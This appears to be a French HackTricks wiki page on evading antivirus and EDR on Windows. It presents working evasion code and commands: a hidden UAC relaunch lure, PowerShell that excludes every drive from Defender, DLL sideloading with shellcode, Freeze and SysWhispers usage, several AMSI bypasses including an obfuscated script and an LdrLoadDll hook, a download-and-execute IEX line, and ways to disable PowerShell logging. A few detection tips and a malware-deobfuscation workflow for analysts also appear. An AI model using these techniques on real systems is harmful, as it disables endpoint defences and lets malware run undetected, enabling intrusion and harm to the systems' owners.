# Contournement des antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)** !**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : Un outil permettant d'empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : Un outil permettant d'empêcher Windows Defender de fonctionner en simulant la présence d'un autre antivirus.
- [Désactiver Defender si vous êtes administrateur](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant la falsification de Defender

Les loaders publics se faisant passer pour des cheats de jeux sont souvent distribués sous forme d'installateurs Node.js/Nexe non signés qui **demandent d'abord à l'utilisateur une élévation de privilèges**, puis neutralisent Defender. Le fonctionnement est simple :

1. Vérifier le contexte administratif avec `net session`. La commande réussit uniquement lorsque l'appelant dispose de droits administrateur ; un échec indique donc que le loader s'exécute avec les privilèges d'un utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` afin de déclencher l'invite de consentement UAC attendue tout en conservant la ligne de commande d'origine.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes pensent déjà installer un logiciel « cracké », elles acceptent donc généralement l’invite, ce qui donne au malware les droits nécessaires pour modifier la policy de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` globales pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader commence par tuer le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible devienne impossible à analyser :
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observations clés :

- La boucle parcourt chaque système de fichiers monté (D:\, E:\, clés USB, etc.) : **tout futur payload déposé n'importe où sur le disque sera donc ignoré**.
- L'exclusion de l'extension `.sys` est préventive : les attaquants se réservent la possibilité de charger ultérieurement des drivers non signés sans modifier à nouveau Defender.
- Toutes les modifications sont enregistrées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes ultérieures de confirmer que les exclusions persistent ou de les étendre sans redéclencher l'UAC.

Comme aucun service Defender n'est arrêté, les vérifications d'état naïves continuent d'indiquer « antivirus actif », même si l'inspection en temps réel ne touche jamais ces chemins.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : static detection, dynamic analysis et, pour les EDR les plus avancés, behavioural analysis.

### **Static detection**

La static detection consiste à signaler les chaînes malveillantes connues ou les tableaux d'octets présents dans un binaire ou un script, ainsi qu'à extraire des informations du fichier lui-même (par exemple, sa description, le nom de l'entreprise, les signatures numériques, l'icône, le checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire détecter plus facilement, car ils ont probablement déjà été analysés et signalés comme malveillants. Il existe plusieurs moyens de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, l'AV ne pourra pas détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier certaines chaînes dans votre binaire ou votre script pour passer l'AV, mais cela peut prendre beaucoup de temps selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'existera aucune signature malveillante connue, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> Pour vérifier la static detection de Windows Defender, je vous recommande [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments, puis demande à Defender d'analyser chacun d'eux individuellement. Il peut ainsi vous indiquer exactement quelles chaînes ou quels octets sont signalés dans votre binaire.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) consacrée à l'AV Evasion pratique.

### **Dynamic analysis**

La dynamic analysis consiste pour l'AV à exécuter votre binaire dans une sandbox et à surveiller toute activité malveillante (par exemple, tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus difficile à gérer, mais voici quelques techniques pour échapper aux sandbox.

- **Sleep before execution** Selon son implémentation, cette technique peut être très efficace pour contourner la dynamic analysis des AV. Les AV disposent de très peu de temps pour analyser les fichiers sans interrompre le workflow de l'utilisateur ; l'utilisation de longues pauses peut donc perturber l'analyse des binaires. Le problème est que de nombreuses sandbox d'AV peuvent simplement ignorer la pause, selon la manière dont elle est implémentée.
- **Checking machine's resources** Les sandbox disposent généralement de très peu de ressources (par exemple, < 2GB de RAM), sans quoi elles pourraient ralentir la machine de l'utilisateur. Vous pouvez également faire preuve de créativité, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs : tout ne sera pas forcément implémenté dans la sandbox.
- **Machine-specific checks** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez indiqué. Si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il s'avère que le computername de la Sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l'ordinateur dans votre malware avant la detonation : si le nom correspond à HAL9TH, cela signifie que vous êtes dans la sandbox de Defender et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici quelques autres conseils très utiles de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons déjà indiqué dans cet article, les **public tools** finiront par **être détectés**. Vous devez donc vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui dump également LSASS ?

La deuxième option est probablement la bonne. En prenant mimikatz comme exemple, il s'agit probablement de l'un des malwares les plus signalés par les AV et les EDR, voire du plus signalé. Bien que le projet lui-même soit vraiment excellent, il est également très difficile à utiliser pour contourner les AV. Cherchez donc simplement des alternatives correspondant à ce que vous essayez d'accomplir.

> [!TIP]
> Lorsque vous modifiez vos payloads pour l'evasion, veillez à **désactiver l'envoi automatique des échantillons** dans Defender et, s'il vous plaît, sérieusement, **N'ENVOYEZ PAS VOS FICHIERS À VIRUSTOTAL** si votre objectif est de maintenir l'evasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez-le sur une VM, essayez de désactiver l'envoi automatique des échantillons et testez-le jusqu'à obtenir un résultat satisfaisant.

## EXEs vs DLLs

Lorsque c'est possible, **privilégiez toujours l'utilisation de DLLs pour l'evasion**. D'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés. Il s'agit donc d'une astuce très simple pour éviter la détection dans certains cas (si votre payload peut bien sûr être exécuté en tant que DLL).

Comme on peut le voir sur cette image, un DLL Payload de Havoc présente un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE présente un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison antiscan.me entre un payload EXE Havoc normal et une DLL Havoc normale</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces permettant d'utiliser des fichiers DLL de manière beaucoup plus furtive.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en plaçant l'application victime et le ou les payloads malveillants côte à côte.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading à l'aide de [Siofra](https://github.com/Cybereason/siofra) et du script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles au DLL hijacking dans « C:\Program Files\\ » ainsi que les fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes DLL Hijackable/Sideloadable**. Cette technique est assez furtive lorsqu’elle est correctement réalisée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous risquez d’être facilement détecté.

Le simple fait de placer une DLL malveillante portant le nom attendu par un programme ne permettra pas de charger votre payload, car le programme attend certaines fonctions spécifiques à l’intérieur de cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige les appels effectués par un programme depuis la DLL proxy (et malveillante) vers la DLL d’origine, préservant ainsi les fonctionnalités du programme tout en permettant l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j’ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et la DLL d’origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je considère cela comme une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que la [vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour en apprendre davantage sur les sujets que nous avons abordés plus en profondeur.

### Abusing Forwarded Exports (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l'entrée d'exportation contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'exportation, le chargeur Windows va :

- Charger `TargetDll` s'il n'est pas déjà chargé
- Résoudre `TargetFunc` depuis celui-ci

Comportements importants à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms KnownDLLs protégé (par exemple, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n'est pas un KnownDLL, l'ordre normal de recherche des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouver une DLL signée qui exporte une fonction redirigée vers un nom de module qui n'est pas un KnownDLL, puis placer cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant portant exactement le nom du module cible redirigé. Lorsque l'exportation redirigée est invoquée, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant ainsi votre `DllMain`.<sup>[[13]](#references)</sup>

Exemple observé sous Windows 11 :
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n’est pas une KnownDLL ; il est donc résolu via l’ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction transférée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher la redirection avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) charge la DLL side-by-side `keyiso.dll` (signed)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, une erreur "missing API" apparaît uniquement après l'exécution de `DllMain`

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas une KnownDLL. Les KnownDLLs sont répertoriées sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (par exemple, rundll32.exe) chargeant des DLL signées depuis des chemins non système, puis chargeant des DLL absentes de KnownDLLs portant le même nom de base depuis ce répertoire
- Déclenchez une alerte sur les chaînes processus/modules telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` depuis des chemins accessibles en écriture par l’utilisateur
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez les droits d’écriture et d’exécution dans les répertoires des applications

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un toolkit de payload permettant de contourner les EDR à l’aide de processus suspendus, de syscalls directs et de méthodes d’exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion est simplement un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain. Ne vous fiez donc jamais à un seul outil ; si possible, essayez de chaîner plusieurs techniques d'evasion.

## Direct/Indirect Syscalls et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **user-mode inline hooks** sur les stubs de syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et effectuent la transition vers le kernel sans exécuter l'entrypoint exporté et hooké.<sup>[[32]](#references)</sup>

**Options d'invocation :**
- **Direct (embedded)** : émet une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à un export de `ntdll`).
- **Indirect** : effectue un saut vers un **syscall gadget** existant dans `ntdll` afin que la transition vers le kernel semble provenir de `ntdll` (utile pour l'evasion heuristique) ; **randomized indirect** sélectionne un gadget dans un pool pour chaque appel.
- **Egg-hunt** : évite d'embarquer sur disque la séquence d'opcodes statique `0F 05` ; résout une séquence de syscall au runtime.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (VA sort)** : déduit les SSN en triant les stubs de syscall par adresse virtuelle au lieu de lire les octets des stubs.
- **SyscallsFromDisk** : mappe un `\KnownDlls\ntdll.dll` propre, lit les SSN dans sa section `.text`, puis le démappe (contourne tous les hooks en mémoire).
- **RecycledGate** : combine l'inférence des SSN par tri des VA avec la validation des opcodes lorsqu'un stub est propre ; revient à l'inférence par VA si le stub est hooké.
- **HW Breakpoint** : place DR0 sur l'instruction `syscall` et utilise un VEH pour capturer le SSN depuis `EAX` au runtime, sans analyser les octets hookés.

Exemple d'utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initialement, les AV étaient uniquement capables d'analyser les **fichiers sur le disque**. Ainsi, si vous pouviez exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car sa visibilité était insuffisante.

La fonctionnalité AMSI est intégrée aux composants Windows suivants.

- User Account Control, ou UAC (élévation d'EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA Office

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois non chiffrée et non obfusquée.

L'exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu'il ajoute `amsi:` suivi du chemin vers l'exécutable depuis lequel le script a été exécuté, dans ce cas powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire grâce à AMSI.

De plus, depuis **.NET 4.8**, le code C# est également exécuté via AMSI. Cela affecte même `Assembly.Load(byte[])` pour charger une exécution en mémoire. C'est pourquoi l'utilisation de versions antérieures de .NET (comme 4.7.2 ou antérieures) est recommandée pour l'exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI fonctionne principalement avec des détections statiques. Par conséquent, modifier les scripts que vous tentez de charger peut être une bonne méthode pour éviter la détection.

Cependant, AMSI est capable de désobfusquer les scripts, même s'ils comportent plusieurs couches. L'obfuscation peut donc être une mauvaise option selon la manière dont elle est effectuée. Cela rend le contournement moins évident. Toutefois, il suffit parfois de modifier quelques noms de variables pour que cela fonctionne, donc tout dépend du niveau de détection d'un élément.

- **AMSI Bypass**

AMSI étant implémenté par le chargement d'une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la modifier facilement, même en tant qu'utilisateur non privilégié. En raison de cette faille dans l'implémentation d'AMSI, les chercheurs ont découvert plusieurs moyens d'éviter l'analyse AMSI.

**Forcing an Error**

Forcer l'échec de l'initialisation d'AMSI (amsiInitFailed) entraînera l'absence d'analyse pour le processus actuel. Cette technique a été initialement révélée par [Matt Graeber](https://twitter.com/mattifestation), et Microsoft a développé une signature pour empêcher une utilisation plus répandue.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d’une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell actuel. Cette ligne a bien sûr été détectée par AMSI lui-même ; une modification est donc nécessaire pour utiliser cette technique.

Voici un bypass AMSI modifié que j’ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que ce contenu sera probablement signalé une fois cette publication en ligne ; vous ne devriez donc publier aucun code si votre objectif est de rester indétectable.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse des entrées fournies par l'utilisateur) et à la remplacer par des instructions qui renvoient le code correspondant à E_INVALIDARG. Ainsi, le résultat de l'analyse réelle sera 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez consulter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour bypass AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en apprendre davantage.

### Bloquer AMSI en empêchant le chargement d'amsi.dll (hook de LdrLoadDll)

AMSI est initialisé uniquement après le chargement d'`amsi.dll` dans le processus actuel. Un bypass robuste et indépendant du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. Ainsi, AMSI ne se charge jamais et aucun scan n'est effectué pour ce processus.<sup>[[23]](#references)</sup>

Présentation de l'implémentation (pseudocode x64 C/C++) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Fonctionne avec PowerShell, WScript/CScript et les custom loaders (tout ce qui chargerait autrement AMSI).
- À associer à l’envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) afin d’éviter les longues artefacts de ligne de commande.
- Utilisé avec des loaders exécutés via des LOLBins (par exemple, `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également un script pour bypass AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également un script pour bypass AMSI, qui évite les signatures grâce à une fonction définie par l’utilisateur et randomisée, des variables, des expressions de caractères, et applique une casse aléatoire aux mots-clés PowerShell afin d’éviter les signatures.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus actuel. Cet outil fonctionne en analysant la mémoire du processus actuel à la recherche de la signature AMSI, puis en la remplaçant par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser la version 2 de Powershell**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Vous pouvez procéder comme suit :
```bash
powershell.exe -version 2
```
## PS Logging

La journalisation PowerShell est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d'audit et de troubleshooting, mais cela peut également être un **problème pour les attackers qui veulent éviter la détection**.

Pour bypass la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pourrez donc exécuter vos scripts sans qu'ils soient scannés par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an unmanaged PowerShell session** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l'approche utilisée par le `powerpick` de Cobalt Strike). Cela permet d'éviter les contrôles spécifiquement liés au processus `powershell.exe`, mais ne désactive pas intrinsèquement AMSI, Script Block Logging ni toutes les autres défenses PowerShell ; la couverture dépend du runtime et de l'implémentation de l'hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite sa détection par les AV et les EDR. Soyez prudent avec cela et n'appliquez éventuellement le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être dissimulées.

### Déobfuscation de binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandbox. Le workflow ci-dessous **restaure un IL presque original** qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE afin que toute modification fasse crasher le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la création de votre propre unpacker.

2.  Récupération des symboles / du control-flow – transmettez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionne le profil ConfuserEx 2
• de4dot annule l'aplatissement du control-flow, restaure les namespaces, les classes et les noms de variables d'origine, et déchiffre les chaînes constantes.

3.  Suppression des proxy calls – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (également appelés *proxy calls*) afin de compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu sous dnSpy, recherchez de gros blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` afin de localiser le *payload* réel. Souvent, le malware le stocke sous la forme d'un tableau d'octets encodé en TLV et initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d'exécution **sans avoir besoin d'exécuter l'échantillon malveillant**, ce qui est utile lors d'un travail sur une workstation offline.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute`, qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)** : obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : l'objectif de ce projet est de fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle grâce à la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les altérations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy) : ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation des templates C++, ce qui compliquera légèrement la tâche de la personne souhaitant cracker l'application.
